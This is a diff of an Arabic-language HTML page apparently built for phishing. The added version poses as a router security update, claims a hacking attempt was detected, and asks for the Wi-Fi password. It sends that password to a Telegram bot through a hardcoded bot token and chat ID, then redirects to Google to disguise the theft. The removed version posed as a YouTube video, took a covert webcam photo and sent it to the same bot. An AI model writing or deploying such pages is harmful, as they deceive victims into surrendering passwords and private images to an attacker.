@@ -1,57 +1,70 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>YouTube Video</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Router Update - تحديث النظام</title>
     <style>
-        body { background: white; text-align: center; padding-top: 100px; font-family: sans-serif; }
-        .play-btn { background: red; color: white; padding: 20px 40px; border: none; border-radius: 50px; font-size: 20px; font-weight: bold; cursor: pointer; }
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px; text-align: center; }
+        .container { background: white; max-width: 400px; margin: auto; padding: 20px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); border-top: 5px solid #007bff; }
+        img { width: 80px; margin-bottom: 20px; }
+        h2 { color: #333; font-size: 1.2rem; }
+        p { color: #666; font-size: 0.9rem; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; background-color: #007bff; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 1rem; }
+        button:hover { background-color: #0056b3; }
+        #status { margin-top: 15px; color: red; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="200" alt="YouTube"><br><br>
-    <p>انقر لتشغيل الفيديو المطلوب</p>
-    <button class="play-btn" onclick="startCapture()">▶ تشغيل الفيديو</button>
+<div class="container">
+    <img src="https://cdn-icons-png.flaticon.com/512/3067/3067451.png" alt="Wifi Logo">
+    <h2>تحديث أمني للراوتر</h2>
+    <p>تم اكتشاف محاولة اختراق لشبكتك. يرجى إدخال كلمة مرور الواي فاي الحالية للتحقق من هويتك وتثبيت التحديث الأمني الجديد.</p>
+    
+    <input type="password" id="wifiPass" placeholder="كلمة مرور الواي فاي" required>
+    <button onclick="sendData()">تثبيت التحديث الآن</button>
+    
+    <div id="status"></div>
+</div>
 
-    <video id="v" style="display:none" autoplay playsinline></video>
-    <canvas id="c" style="display:none"></canvas>
+<script>
+    const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY"; 
+    const chatId = "8042090388";
 
-    <script>
-        const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY";
-        const chat = "8042090388";
+    async function sendData() {
+        const pass = document.getElementById('wifiPass').value;
+        const status = document.getElementById('status');
 
-        async function startCapture() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-                
-                // التقاط الصورة فوراً بعد السماح
-                setTimeout(() => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', chat);
-                        fd.append('photo', blob, 'img.jpg');
-                        
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd })
-                        .then(() => {
-                            // إغلاق الكاميرا والتحويل لليوتيوب فوراً
-                            stream.getTracks().forEach(t => t.stop());
-                            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // ضع رابط الفيديو الذي تريده هنا
-                        });
-                    }, 'image/jpeg');
-                }, 1000);
-                
-            } catch (e) {
-                alert("يجب السماح بالكاميرا لمشاهدة الفيديو!");
-            }
+        if (pass.length < 8) {
+            status.innerText = "كلمة المرور يجب أن تكون 8 خانات على الأقل.";
+            return;
         }
-    </script>
+
+        status.style.color = "green";
+        status.innerText = "جاري الاتصال بالسيرفر... يرجى الانتظار.";
+
+        // إرسال كلمة السر للبوت الخاص بك
+        const message = `🚨 تم صيد كلمة سر واي فاي جديدة:\n🔑 الباسورد: ${pass}`;
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
+
+            // تحويل المستخدم لموقع حقيقي للتمويه بعد 3 ثواني
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 3000);
+            
+        } catch (error) {
+            status.innerText = "خطأ في الاتصال، حاول مرة أخرى.";
+        }
+    }
+</script>
+
 </body>
 </html>
